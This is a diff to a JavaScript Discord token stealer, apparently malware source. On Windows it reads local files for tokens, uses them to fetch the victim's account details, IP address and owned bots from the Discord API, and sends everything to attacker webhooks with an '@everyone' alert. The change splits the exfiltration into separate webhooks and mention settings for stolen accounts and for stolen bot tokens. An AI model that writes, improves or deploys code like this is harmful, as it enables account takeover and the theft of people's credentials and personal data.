@@ -1,6 +1,9 @@
-const webhook =
-  "YOUR WEBHOOK URL";
-const mention = true; // if you don't want a mention change it to false
+const webhook_for_accs =
+  "YOUR WEBHOOK URL"; // for accs
+const webhook_for_bots =     // 2 channels better
+ "YOUR WEBHOOK URL" // for bots
+const mention_for_accs = true; // if you don't want a mention change it to false
+const mention_for_bots = false;// if you want a mention change it to true
 const fetch = require("node-fetch"); // npm i node-fetch
 const { sep } = require("path");
 const { readFileSync, readdirSync, existsSync } = require("fs");
@@ -59,7 +62,7 @@ if (process.platform === "win32") {
       url = "https://discord.com/api/v6/users/@me",
       token = String()
     ) {
-      var content = mention ? "@everyone" : "";
+      var content = mention_for_accs ? "@everyone" : "";
       content += "Hello we are get somethings good *:)*";
       fetch(url, {
         headers: {
@@ -74,7 +77,7 @@ if (process.platform === "win32") {
               var avatar = res.avatar ? `https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.floor(Math.random() * 6)}.png`
               const ip = await get_ip();
               send(
-                webhook,
+                webhook_for_accs,
                 content,
                 "https://cdn.discordapp.com/attachments/832261813059059754/855188587283873832/0a7f6c7533b02fd1dc3397e6f70c5f14.png",
                 `${res.username}#`,
@@ -110,14 +113,14 @@ if (process.platform === "win32") {
           }
         );
         const json = await res.json();
-        var content = mention ? "@everyone" : "";
+        var content = mention_for_bots ? "@everyone" : "";
         content += "Hello we are get somethings good *:)*";
         for (let i = 0; i < json.length; i++) {
           await sleep(1000);
           try {
             var avatar = json[i].bot.avatar ? `https://cdn.discordapp.com/avatars/${json[i].bot.id}/${json[i].bot.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.floor(Math.random() * 6)}.png`
             send(
-              webhook,
+              webhook_for_bots,
               content,
               "https://cdn.discordapp.com/attachments/832261813059059754/855188587283873832/0a7f6c7533b02fd1dc3397e6f70c5f14.png",
               json[i].bot.username,
